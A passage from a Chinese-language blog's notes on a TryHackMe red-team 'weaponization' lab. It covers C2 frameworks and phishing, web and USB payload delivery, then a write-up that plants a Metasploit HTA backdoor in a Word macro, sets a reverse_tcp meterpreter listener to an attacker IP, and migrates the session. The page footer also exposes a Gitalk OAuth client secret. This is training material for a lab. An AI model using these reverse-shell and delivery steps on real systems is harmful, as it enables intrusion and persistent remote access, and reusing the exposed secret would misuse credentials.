<h3 id="常用C2框架"><a href="#常用C2框架" class="headerlink" title="常用C2框架"></a>常用C2框架</h3><h4 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h4><blockquote>
<p>Cobalt Strike 是一款商業框架，專注於對手模擬和紅隊行動。它結合了遠程訪問工具、滲透後能力以及獨特的報告系統。它提供了一個代理，擁有先進的技術來建立隱蔽的通信並執行各種操作，包括鍵盤記錄、文件上傳和下載、VPN部署、權限提升技術、Mimikatz、端口掃描以及最先進的橫向移動。</p>
</blockquote>
<h4 id="PowerShell-Empire"><a href="#PowerShell-Empire" class="headerlink" title="PowerShell Empire"></a>PowerShell Empire</h4><blockquote>
<p>PowerShell Empire 是一個開源框架，它幫助紅隊操作員和滲透測試人員通過使用密鑰和共享密碼在多個服務器之間進行協作。它是基於 PowerShell 和 Python 代理的利用框架。PowerShell Empire 專注於 Windows 和 Active Directory 環境的客戶端和滲透後的利用。</p>
</blockquote>
<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><blockquote>
<p>Metasploit 是一個廣泛使用的滲透測試框架，提供各種技術和工具以便輕鬆進行黑客攻擊。它是一個開源框架，被認為是滲透測試和紅隊行動的主要工具之一。Metasploit 是我們在此房間中使用的工具之一，用來生成我們武器化階段的負載。</p>
</blockquote>
<h2 id="交付技巧"><a href="#交付技巧" class="headerlink" title="交付技巧"></a>交付技巧</h2><blockquote>
<p>交付技術是獲得初始訪問的重要因素之一。他們必須讓受害者看起來專業、合法、令人信服，才能貫徹執行內容。</p>
</blockquote>
<h3 id="電子郵件傳送"><a href="#電子郵件傳送" class="headerlink" title="電子郵件傳送"></a>電子郵件傳送</h3><blockquote>
<p>使用電子郵件傳遞負載是一種常見的方法，通常是通過發送含有鏈接或附件的釣魚郵件來實現。這種方法附加了一個惡意文件，可能是我們之前提到的類型。其目的是說服受害者訪問惡意網站或下載並運行惡意文件，以便獲得對受害者網絡或主機的初始訪問權限。<br>紅隊成員應擁有自己用於釣魚的基礎設施。根據紅隊活動的要求，需要在電子郵件服務器內設置各種選項，包括域密鑰確認郵件（DKIM）、發送者政策框架（SPF）和DNS指針（PTR）記錄。<br>紅隊成員還可以使用具有良好聲譽的第三方電子郵件服務，如 Google Gmail、Outlook、Yahoo 等。<br>另一個有趣的方法是使用公司內部的被攻破的電子郵件帳戶來向公司內部或其他人發送釣魚郵件。被攻破的電子郵件可能是通過釣魚或其他技術如密碼噴霧攻擊被黑的。</p>
</blockquote>
<h3 id="網頁傳遞"><a href="#網頁傳遞" class="headerlink" title="網頁傳遞"></a>網頁傳遞</h3><blockquote>
<p>紅隊成員控制的網絡服務器上托管惡意負載。網絡服務器必須遵循安全指南，例如其域名擁有清潔的記錄和聲譽，以及TLS（傳輸層安全）證書。<br>也就是紅隊成員可以將惡意軟體或負載放置在由他們控制的網路伺服器上。為了確保這個方法的成功，這個網路伺服器需要符合一些安全指南，比如它的域名需要有一個良好的記錄和聲譽，並且需要擁有一個有效的 TLS（傳輸層安全）證書。這樣做的目的是為了讓受害者感覺這個網站是可信的，從而誘使他們訪問或下載這些惡意負載。<br>這種方法包括其他技術，如社交工程手段誘使受害者訪問或下載惡意文件。在使用這種方法時，URL縮短器可能會很有幫助。<br>在這種方法中，可以結合並使用其他技術。攻擊者可以利用零日漏洞，例如利用易受攻擊的軟體如Java或瀏覽器，將它們用於釣魚郵件或網頁傳遞技術中，以獲得對受害者機器的訪問權限。</p>
</blockquote>
<h3 id="USB-交付"><a href="#USB-交付" class="headerlink" title="USB 交付"></a>USB 交付</h3><blockquote>
<p>這種方法需要受害者在物理上插入惡意的 USB。這種方法在會議或活動中可能會非常有效和有用，因為對手可以在那裡分發 USB。<br>通常，組織會建立強有力的政策，例如出於安全考量，在其組織環境中禁用 USB 使用。而其他組織則允許在目標環境中使用 USB。<br>用於武器化 USB 設備的常見 USB 攻擊包括 Rubber Ducky 和 USBHarpoon，以及像 O.MG Cable 這樣的充電 USB 線。</p>
</blockquote>
<h2 id="小試身手"><a href="#小試身手" class="headerlink" title="小試身手"></a>小試身手</h2><h3 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>我们已经准备了一台运行Windows 10的计算机，上面运行着一个用户模拟Web应用程序，用于自动执行你的有效载荷或访问恶意的HTA链接。部署附带的机器，并等待几分钟直到它启动并运行。然后，访问位于 <a target="_blank" rel="noopener" href="http://machine_ip:8080/">http://MACHINE_IP:8080/</a> 的用户模拟Web应用程序。<br>Web应用程序允许上传VBS、DOC、PS1文件格式的有效载荷。此外，如果你提供一个恶意的HTA链接，Web应用程序将访问你的链接。<br>关于Doc文件的注意事项：在提供的Windows 10机器上使用的模拟将打开恶意Word文档，并在90秒内关闭。为了获得更长的存在时间，你需要在收到连接后尽快进行迁移。<br>在Metasploit框架中，我们可以使用迁移（migrate）功能将当前进程注入到受害机器上的另一个进程中。在我们的案例中，我们需要将当前的进程，即MS Word文档，迁移到另一个进程中，以使连接在MS Word文档关闭后仍保持稳定。最简单的方法是使用以下的迁移后模块（migrate post-module），</p>
</blockquote>
<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><blockquote>
<p>利用msf創建一個hta的後門程式<br>將程式代碼附近到word裡的巨集並儲存<br>啟用msf監聽</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.50.159.15</span><br><span class="line">set LPORT 443</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<blockquote>
<p>將word檔上傳到受害機<br><img src="/photo/Red_Team_Weaponization/41.jpg" alt="41"><br>轉移對話</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate </span><br></pre></td></tr></table></figure>
<blockquote>
<p><img src="/photo/Red_Team_Weaponization/43.jpg" alt="43"><br>尋找使用者桌面資料找到flag<br><img src="/photo/Red_Team_Weaponization/42.jpg" alt="42"></p>
</blockquote>

	  <div class="article-footer-copyright">
    Zhi筆記部落格
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/04/29/Red-Team-Password-Attacks/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/04/20/Red-Team-Recon/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
		<section id="comments" class="comments">
			<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<div id="gitalk-container"></div>
<script>
  var gitalkConfig = {"enable":true,"clientID":"a5d7fbf7598366da6c6d","clientSecret":"55bbba32bf5c425d62e4562e6e0cdc1069f302ae","repo":"Zhi251.github.io","owner":"","admin":[""],"id":"location.pathname","distractionFreeMode":true};
  var gitalk = new Gitalk(gitalkConfig);
  gitalk.render('gitalk-container');
</script>

		</section>
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-04-25 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/紅隊武器化/">紅隊武器化<span>1</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/筆記/">筆記<span>6</span></a></li> <li><a href="/tags/紅隊/">紅隊<span>3</span></a></li> <li><a href="/tags/tryhackme/">tryhackme<span>3</span></a></li> <li><a href="/tags/道德黑客/">道德黑客<span>4</span></a></li> <li><a href="/tags/自學/">自學<span>4</span></a></li> <li><a href="/tags/攻擊階段-武器化/">攻擊階段-武器化<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%AD%A6%E5%99%A8%E5%8C%96"><span class="toc-article-text">武器化</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%B0%A1%E4%BB%8B"><span class="toc-article-text">簡介</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%B4%85%E9%9A%8A%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="toc-article-text">紅隊工具包</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%B6%B2%E5%9D%80"><span class="toc-article-text">網址</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%83%A8%E7%BD%B2Windows%E6%A9%9F%E5%99%A8"><span class="toc-article-text">部署Windows機器</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windows-%E8%85%B3%E6%9C%AC%E5%AE%BF%E4%B8%BB-WSH"><span class="toc-article-text">Windows 腳本宿主 - WSH</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%B0%A1%E5%96%AE%E8%85%B3%E6%9C%AC%E7%B7%A8%E5%AF%AB-VBScript"><span class="toc-article-text">簡單腳本編寫(VBScript)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%98%BE%E7%A4%BA%E2%80%9CWelcome-to-THM%E2%80%9D%E6%B6%88%E6%81%AF%E7%9A%84-Windows-%E6%B6%88%E6%81%AF%E6%A1%86"><span class="toc-article-text">显示“Welcome to THM”消息的 Windows 消息框</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Windows-%E5%8E%9F%E7%94%9F%E5%BC%95%E6%93%8E%EF%BC%88WSH%EF%BC%89%E6%89%A7%E8%A1%8C-exe-%E6%96%87%E4%BB%B6"><span class="toc-article-text">Windows 原生引擎（WSH）执行 .exe 文件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#VBS-%E6%96%87%E4%BB%B6%E8%A2%AB%E5%88%97%E5%85%A5%E9%BB%91%E5%90%8D%E5%8D%95%E8%99%95%E7%90%86%E6%96%B9%E5%BC%8F"><span class="toc-article-text">VBS 文件被列入黑名单處理方式</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#HTML-%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F-HTA"><span class="toc-article-text">HTML 應用程式 - HTA</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%B0%A1%E4%BB%8B-1"><span class="toc-article-text">簡介</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%AF%84%E4%BE%8B"><span class="toc-article-text">範例</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#hta%E5%8F%8D%E5%90%91%E9%80%A3%E6%8E%A5"><span class="toc-article-text">hta反向連接</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%94%9F%E6%88%90%E8%85%B3%E6%9C%AC"><span class="toc-article-text">生成腳本</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%95%9F%E7%94%A8%E7%9B%A3%E8%81%BD"><span class="toc-article-text">啟用監聽</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Visual-Basic-%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F-VBA"><span class="toc-article-text">Visual Basic 應用程式 - VBA</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%B0%A1%E4%BB%8B-2"><span class="toc-article-text">簡介</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%A4%BA%E7%AF%84"><span class="toc-article-text">示範</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Microsoft-Word-%E6%96%87%E6%AA%94%E6%89%93%E9%96%8B%E6%99%82%E8%87%AA%E5%8B%95%E5%9F%B7%E8%A1%8C"><span class="toc-article-text">Microsoft Word 文檔打開時自動執行</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#AutoOpen"><span class="toc-article-text">AutoOpen</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Document-Open"><span class="toc-article-text">Document_Open</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%A4%BA%E7%AF%84-1"><span class="toc-article-text">示範</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Microsoft-Word-%E6%96%87%E6%AA%94%E6%89%93%E9%96%8B%E6%99%82%E8%87%AA%E5%8B%95%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F"><span class="toc-article-text">Microsoft Word 文檔打開時自動執行程式</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8msf%E7%94%9F%E6%88%90%E5%8F%8D%E5%90%91%E9%80%A3%E6%8E%A5%E4%BB%A3%E7%A2%BC%E4%B8%A6%E9%80%A3%E6%8E%A5word"><span class="toc-article-text">利用msf生成反向連接代碼並連接word</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerShell-PSH"><span class="toc-article-text">PowerShell - PSH</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%B0%A1%E4%BB%8B-3"><span class="toc-article-text">簡介</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%A1%AF%E7%A4%BA-%E2%80%9CWelcome-to-the-Weaponization-Room-%E2%80%9D"><span class="toc-article-text">顯示 “Welcome to the Weaponization Room!”</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%89%B5%E5%BB%BA%E8%85%B3%E6%9C%AC"><span class="toc-article-text">創建腳本</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC"><span class="toc-article-text">執行腳本</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%8D%B2%E5%8F%96%E5%8F%8D%E5%90%91-shell"><span class="toc-article-text">獲取反向 shell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%B8%8B%E8%BC%89powershell"><span class="toc-article-text">下載powershell</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%91%BD%E4%BB%A4%E8%88%87%E6%8E%A7%E5%88%B6-%EF%BC%88C2-%E6%88%96-C-C%EF%BC%89"><span class="toc-article-text">命令與控制 -（C2 或 C&amp;C）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BB%80%E9%BA%BC%E6%98%AF%E6%8C%87%E6%8F%AE%E8%88%87%E6%8E%A7%E5%88%B6%EF%BC%88C2%EF%BC%89%EF%BC%9F"><span class="toc-article-text">什麼是指揮與控制（C2）？</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B8%B8%E7%94%A8C2%E6%A1%86%E6%9E%B6"><span class="toc-article-text">常用C2框架</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Cobalt-Strike"><span class="toc-article-text">Cobalt Strike</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#PowerShell-Empire"><span class="toc-article-text">PowerShell Empire</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Metasploit"><span class="toc-article-text">Metasploit</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BA%A4%E4%BB%98%E6%8A%80%E5%B7%A7"><span class="toc-article-text">交付技巧</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%9B%BB%E5%AD%90%E9%83%B5%E4%BB%B6%E5%82%B3%E9%80%81"><span class="toc-article-text">電子郵件傳送</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%B6%B2%E9%A0%81%E5%82%B3%E9%81%9E"><span class="toc-article-text">網頁傳遞</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#USB-%E4%BA%A4%E4%BB%98"><span class="toc-article-text">USB 交付</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B0%8F%E8%A9%A6%E8%BA%AB%E6%89%8B"><span class="toc-article-text">小試身手</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%A1%8C%E7%9B%AE"><span class="toc-article-text">題目</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#writeup"><span class="toc-article-text">writeup</span></a></li></ol></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <!--
<p>
  
  &copy; 2024 Zhi's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
//於底下添加沒用的版本訊息
--->
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
